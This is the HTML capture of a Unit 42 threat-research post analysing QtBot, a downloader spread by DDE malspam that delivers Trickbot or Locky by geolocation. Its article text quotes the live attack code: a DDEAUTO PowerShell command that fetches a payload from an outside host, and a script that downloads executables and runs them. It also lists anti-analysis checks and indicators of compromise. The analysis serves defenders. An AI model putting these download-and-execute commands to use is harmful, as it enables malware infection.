
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Everybody Gets One: QtBot Used to Distribute Trickbot and Locky</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Unit 42 investigates QtBot downloader used to distribute Trickbot and Locky."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Everybody Gets One: QtBot Used to Distribute Trickbot and Locky" />
<meta property="og:description" content="Unit 42 investigates QtBot downloader used to distribute Trickbot and Locky." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Locky" />
<meta property="article:tag" content="QtBot" />
<meta property="article:tag" content="Trickbot" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-11-01T20:00:10+00:00" />
<meta property="article:modified_time" content="2020-07-03T01:07:20+00:00" />
<meta property="og:updated_time" content="2020-07-03T01:07:20+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 investigates QtBot downloader used to distribute Trickbot and Locky." />
<meta name="twitter:title" content="Everybody Gets One: QtBot Used to Distribute Trickbot and Locky" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Everybody Gets One: QtBot Used to Distribute Trickbot and Locky Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky/feed/" />
<meta property="og:likes" content="1"/>
<meta property="og:readtime" content="8"/>
<meta property="og:views" content="29,521"/>
<meta property="og:date_created" content="November 1, 2017 at 1:00 PM"/>
<meta property="og:post_length" content="2168"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Brandon Levene"/>
<meta property="og:author" content="Brandon Young"/>
<meta property="og:author" content="Dominik Reichel"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/brandon-levene/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/brandon-young/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/dominik-reichel/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Everybody Gets One: QtBot Used to Distribute Trickbot and Locky","name":"Everybody Gets One: QtBot Used to Distribute Trickbot and Locky","description":"Unit 42 investigates QtBot downloader used to distribute Trickbot and Locky.","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky\/","datePublished":"November 1, 2017","articleBody":"Introduction\r\nThe most common Locky and Trickbot affiliates are being distributed via shared malspam campaigns. Unit 42 and external malware researchers believe the payloads are geo-targeted. Previously, geo-targeting was controlled by a relatively simplistic VBA script which utilized GeoIP lookup services and parsed the country code to determine the compromised host\u2019s location. With this information, the VBA script would enter a loop checking for the presence of the country codes: UK, IE, AU, GB, LU, or BE and, if any of those country codes was present, URIs to serve Trickbot were selected for download and execution. If this check failed, Locky would be served instead.\r\nRecently, Unit 42 researcher Brad Duncan observed Necurs malspam campaigns distributing Microsoft Office documents that were abusing DDE. These documents load an intermediate downloader which we have tagged in AutoFocus as \u201cQtBot\u201d. QtBot replaces the previously discussed VBA and features a robust anti-analysis suite to protect itself. This new downloader is responsible for loading the final payload, either Locky or Trickbot, again based on GeoIP. Palo Alto Networks has observed more than 4 million unique sessions with QtBot activity since October 19th, 2017.\r\n\r\nThe Lure\r\nThe malicious DDE documents are included as attachments to malspam lures like the one below (seen 10\/24\/2017):\r\n\r\nFigure 1. Shows an example email lure with a malicious document that uses DDE to deliver a payload.\r\nTypically, these lures are very simple. Most of the observed lures fall either within the \u201cFinancial Statement\u201d category (Invoice, Billing, Receipt) or \u201cFile Transfer\u201d category (efax, file scan). This campaign relies on the user to download the attachment, open it, and click through several dialog boxes. The attached document, bb92218314ffdc450320f1d44d8a2fe163c585827d9ca3e9a00cb2ea0e27f0c9, contains the following DDE object:\r\n[URL Defanged]\r\nDDEAUTO C:\\\\Windows\\\\System32\\\\cmd.exe \"\/k powershell.exe -NonI -\r\nnoexit -NoP -sta $sr=(new-object IO.StreamReader\r\n((([Net.WebRequest]::Create('hXXp:\/\/burka.ch\/JHhdg33')).GetResponse())\r\n.GetResponseStream())).ReadToEnd();powershell.exe -e $sr\"\r\n\r\n\r\nNetwork Traffic\r\nLet\u2019s examine the network traffic. Immediately following the user\u2019s click-throughs of three dialog boxes, the following HTTP GET request is issued. Interestingly, its likely this initial command and control server is simply a compromised webhost running a vulnerable version of PLESK as can be seen by the X-Powered-By header in the HTTP response.\r\n\r\nFigure 2. DDE downloads a base64 blob for execution. Also, an interesting note: this initial server hosting the \u00a0scriptlet is using PLESK and is likely compromised.\r\n\r\nThe base64 blob decodes to the following [URLs defanged]:\r\n$urls = \"hXXp:\/\/aurea-\r\nart[.]ru\/incrHG32\",\"hXXp:\/\/castellodimontegioco[.]com\/incrHG32\",\"hXXp:\r\n\/\/nl.flipcapella[.]com\/incrHG32\",\"hXXp:\/\/dotecnia[.]cl\/incrHG32\",\"hXXp\r\n:\/\/christakranzl[.]at\/incrHG32\"\r\nforeach($url in $urls){\r\nTry\r\n{\r\n\tWrite-Host $url\r\n\t$fp = \"$env:temp\\theyweare64.exe\"\r\n\tWrite-Host $fp\r\n\t$wc = New-Object System.Net.WebClient\r\n\t$wc.DownloadFile($url, $fp)\r\n\tStart-Process $fp\r\n\tbreak\r\n}\r\nCatch\r\n{\r\n   Write-Host $_.Exception.Message\r\n}\r\n}\r\n\r\nThe entire list is iterated over until a valid download location is found (this can be observed in the cmd.exe window which is spawned in the background by the initial DDE execution). Once a live command and control server responds, the QtBot binary (798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120) is downloaded in the clear.\r\n\r\n\r\nFigure 3. Download of the QtBot downloader, with the executable in the clear. Note that the Content-Type doesn\u2019t match.\r\n\r\nOnce the QtBot binary has been downloaded, its executed from the user\u2019s %temp% directory using the PowerShell directive Start-Process which can be seen in the decoded base64 blob included in the code block above. When QtBot is started, it initially performs a connectivity check to the legitimate domain, ds.download.windowsupdate[.]com, via an HTTP POST request.\r\n\r\n\r\nFigure 4. Downloader component issues a request to an innocuous domain as a connectivity check.\r\n\r\nFinally, once the connectivity check passes, QtBot will beacon back to its command and control server using an HTTP POST request with an RC4 encrypted payload and await a response which is encrypted with the same RC4 key. The User-Agent \u201cWindows-Update-Agent\u201d in the connectivity check, initial check-in, and final payload delivery are all identical.\r\nFor the network traffic below, we will use the QtBot sample, d97be402740f6a0fc70c90751f499943bf26f7c00791d46432889f1bedf9dbd2, as at the time of analysis the command and control server was still live and serving geo specific payloads.\r\nIn cases where the geolocation matches a set list (we believe this list is likely identical to the earlier VBA discussed in the Introduction section), we will see the traffic below.\r\n\r\n\r\nFigure 5. The downloader Trojan posts data back to the command and control server. This likely determines geolocation based targeting, this request led to the download of Trickbot as we used a UK based exit point. Trickbot download can be seen in Figure 6. \u00a0Note the user-agent header is identical to that of the connectivity check in Figure 4.\r\n\r\nDue to the host being within the UK, we received an encrypted Trickbot payload. The decrypted Trickbot observed in the request below is 4fcee2679cc65585cc1c1c7baa020ec262a2b7fb9b8dc7529a8f73fab029afad.\r\n\r\n\r\nFigure 6. Payload downloaded by the intermediate downloader. In this case, Trickbot.\r\n\r\nIn the following figures, we see a host POST data back to the C2 and receive a slightly different response. This is because the host is in a location not specifically targeted for Trickbot delivery. Thus, we expect to see a different download location and likely a Locky payload.\r\n\r\nFigure 7.\u00a0 The downloader Trojan posts data back to the command and control server. This likely determines geolocation based targeting, this request led to the download of Locky as we used a CA based exit point. Locky download can be seen in Figure 8.\r\n\r\nBelow we see a different payload from a different location due to the server\u2019s response. In this case the payload is an encrypted Locky binary. This decrypted binary is 9d2ce15fd9112d52fa09c543527ef0b5bf07eb4c07794931c5768e403c167d49.\r\n\r\nFigure 8. Payload downloaded by the intermediate downloader. In this case, Locky.\r\n\r\nWith the network behavior laid out from initial execution to payload delivery, lets take a closer look at the intermediate downloader, QtBot.\r\n\r\nQtBot Analysis\r\nThe QtBot downloader is a Windows executable file that decrypts an importless stub into memory. This payload is later injected into msiexec.exe using common techniques.\u00a0 The payload then decrypts the second stage shellcode and injects it into a newly spawned svchost.exe process.\u00a0 This svchost.exe acts as the handler for the final payload.\r\nWhen QtBot initially executes, a new thread is created which is responsible for process scanning. This process scanning is used to identify analysis tools and, if any are found, terminate the malware\u2019s further execution. This check is periodically repeated on a loop. Process hashes are calculated by lower casing the process name, calculating the crc32 of the result, and XORing the crc32 value with 0x2e5d47c8. \u00a0The XOR value appears to change on a regular basis, thus the hashes below only apply to 798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120. The following hash values are checked against running processes:\r\n0x171AF567\r\n0xB713B22E\r\n0x59F3573F - wireshark.exe\r\n0xA9275283 - peid.exe\r\n0x2C533BA3\r\n0xB1FDD418 - x64dbg.exe\r\n0xA7B71C08\r\n0x5BBA66D5\r\n0xFD62D761\r\n0xB01C9DA9 - cff explorer.exe\r\n0xE7AC4C20\r\n0x8718A391 - procexp.exe\r\n0x817D523A - ollydbg.exe\r\n0x9A65393D - lordpe.exe\r\n0x4B1B38C6 - processhacker.exe\r\n0xBD46C402\r\n0x72472F0B - tcpview.exe\r\n0x151648CD\r\n0x4A694A06 - vboxservice.exe\r\n0x956511A3 - sbiesvc.exe\r\n0x09D19890 - vmtoolsd.exe\r\n0x70383CD2\r\n0x40C795F0 - petools.exe\r\n0x6D2607D8 - exeinfope.exe\r\n0x4D9803BC - vboxtray.exe\r\n0x29FBEE3C - windbg.exe\r\n0x0872D0FC\r\n0x28F7E9A8 - idaq.exe\r\n0x3D0598D0 - x32dbg.exe\r\n0x1D141E5D\r\n0xFCB2810C - python.exe\r\n0x2AA827DB\r\n0xCA9B2CDE\r\n0x75F4F636 - procmon.exe\r\n\r\nThe payload then creates randomly generated numerical mutex along with the registry key \u201cHKCU\\Software\\QtProject\u201d. This registry key has been used in the past by legitimate Qt framework software and is not strictly to be considered malicious on its own.\r\nOnce the mutex and registry string are created, the malware uses RC4 with a hardcoded key to decrypt numerous strings which are reproduced below (note these strings are from 798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120):\r\ncmd.exe\r\nSoftware\\Microsoft\\Windows\\CurrentVersion\r\nboom\r\nhttp:\/\/toundlefa[.]net\/\r\nSoftware\\QtProject\r\nmsiexec.exe\r\nsvchost.exe\r\n\/c start %s &amp;&amp; exit\r\ncmd.exe\r\n\\System32\\CompMgmtLauncher.exe\r\nrunas\r\nSoftware\\Classes\\mscfile\r\n\\shell\\open\\command\r\ntmp_file\r\nSoftware\\Microsoft\\Windows\\CurrentVersion\r\n\\Policies\\Explorer\r\n\\Run\r\nCheck Update\r\nPOST\r\nContent-Type: application\/octet-stream\r\nConnection: close\r\nDZCW\r\n6VK3\r\nregsvr32.exe\r\nhttp:\/\/ds.download.windowsupdate.com\/\r\n{\"rep\":0,\"bid\":\"%s\",\"ver\":%d,\"cam\":\"%s\",\"cis\":%d,\"lvl\":%d,\"adm\":%d,\"bit\":%d,\"osv\":%d,\"osb\":%d,\"tmt\":%d}\r\n{\"rep\":1,\"bid\":\"%s\",\"tid\":\"%s\",\"res\":%d}\r\n\r\nThe hardcoded RC4 Key, 0x7A3C5B7CB7FCE715702AA0F4F4EC0935E759FD3B7B6BCC70159D61CF42814B81, is reused throughout this campaign to encrypt and decrypt network communications.\r\nQtBot includes a function which checks for the keyboard layouts common to former USSR countries, if any are found, execution is terminated. This routine is shown below:\r\n\r\nFigure 9. Keyboard layout checks in order to prevent infection of former USSR countries.\r\n\r\nFor persistence, a temp file is generated with a randomly generated name and stored in %APPDATA%\\Local\\Temp\\ in a randomly named folder.\r\nThis randomly generated value is used for the folder name and is stored in the registry key \u201cHKCU\\Software\\QtProject\u201d in the value \u201c0FAD2D5E\u201d. The malware stores additional encrypted data in this key:\r\n\u201c0FAD2D5E\u201d \u2013 Random Value + Unicode temp file name + length of data blob\r\n\u201c0FAD2D5EDZCW\u201d \u2013 RC4 Encrypted C2 Domain\r\nSuccessful malware communications use a format string like the one below:\r\n{\"rep\":0,\"bid\":\"%s\",\"ver\":%d,\"cam\":\"%s\",\"cis\":%d,\"lvl\":%d,\"adm\":%d,\"bit\":%d,\"osv\":%d,\"osb\":\r\n%d,\"tmt\":%d}\r\n\r\nWhen this is filled in, it would look similar to the following:\r\n{\"rep\":0,\"bid\":\"LD0fJMblnCbrDT8Mvma4Rg==\",\"ver\":256,\"cam\":\"nightboom\",\"cis\":0,\"lvl\":1228\r\n8,\"adm\":1,\"bit\":1,\"osv\":1537,\"osb\":7601,\"tmt\":30}\r\n\r\nSome of these values are unknown, though we are able to speculate the nature of their meanings.\u00a0 We believe they are as follows:\r\n\"rep\" \u2013 communication attempt repetitions from a single host\r\n\"bid\" \u2013 binary identification; this value is stored in registry value \"0FAD2D5E\" and is RC4\r\nencrypted and base64 encoded before sending\r\n\"ver\" \u2013 likely versioning information\r\n\"cam\" \u2013 campaign name\r\n\"cis\" \u2013 unknown hardcoded value\r\n\"lvl\" \u2013 system integrity level\r\n\"adm\" \u2013 if the malware has administrative privileges\r\n\"bit\" \u2013 unknown\r\n\"osv\" \u2013 operating system version\r\n\"osb\" \u2013 operating system build\r\n\"tmt\" \u2013 timeout in seconds\r\n\r\nSimilarities to Andromeda\r\nExisting analysis of the Andromeda loader and bot reveals some commonalities between Andromeda and QtBot.\u00a0 The most apparent similarities of these two families are the running process hash check \u00a0used for anti-analysis, host infection denylisting based on language identifiers returned from GetKeyboardLayout, separate infection and task reports for C2 reporting, and code injection target, msiexec.exe.\u00a0 At this time due to the seemingly major updates to the base Andromeda, which is still active, we are referring to this particular family as a new entity and have created a separate identifier in Autofocus, QtBot, to help users differentiate.\r\n\r\nConclusion\r\nWhile geographic location specific malware delivery is not a new phenomenon, the combination of two previously disparate malware family affiliates utilizing unified malspam campaigns and droppers is an interesting shift in tactics. QtBot protects itself and the decision tree by which targeting is established and offers a significantly more robust anti-analysis package to stymie analysts.\r\nPalo Alto Networks has observed more than 4 million unique sessions with QtBot behaviors which can be seen with the QtBot tag in AutoFocus. Customers using Wildfire are protected from this threat.\r\nPalo Alto Networks would like to thank researchers at Proofpoint, who identifies this threat as \"QtLoader\", for first bringing these campaigns to our attention.\r\n\r\nIOCs\r\n798aa42748dcb1078824c2027cf6a0d151c14e945cb902382fcd9ae646bfa120 \u2013 QtBot\r\nd97be402740f6a0fc70c90751f499943bf26f7c00791d46432889f1bedf9dbd2 \u2013 QtBot used for payload differentiation screenshots\r\nbb92218314ffdc450320f1d44d8a2fe163c585827d9ca3e9a00cb2ea0e27f0c9 \u2013 DDE Dropper\r\n9d2ce15fd9112d52fa09c543527ef0b5bf07eb4c07794931c5768e403c167d49 \u2013 Locky\r\n4fcee2679cc65585cc1c1c7baa020ec262a2b7fb9b8dc7529a8f73fab029afad \u2013 Trickbot\r\nhXXp:\/\/hobystube[.]net \u2013 Locky Download Location\r\nhXXp:\/\/kengray[.]com \u2013 Trickbot Download Location\r\nhXXp:\/\/fetchstats[.]net \u2013 QtBot C2\r\nhXXp:\/\/toundlefa[.]net \u2013 QtBot C2\r\nhXXp:\/\/aurea-art[.]ru\/incrHG32\r\nhXXp:\/\/castellodimontegioco[.]com\/incrHG32\r\nhXXp:\/\/nl.flipcapella[.]com\/incrHG32\r\nhXXp:\/\/dotecnia[.]cl\/incrHG32\r\nhXXp:\/\/christakranzl[.]at\/incrHG32\r\nhXXp:\/\/burka[.]ch\/JHhdg33\r\nhXXp:\/\/celebrityonline[.]cz \u2013 URI varies based on payload","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Brandon Levene"},{"@type":"Person","name":"Brandon Young"},{"@type":"Person","name":"Dominik Reichel"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"48102","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=48102' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-everybody-gets-one-qtbot-used-distribute-trickbot-locky%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-48102 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
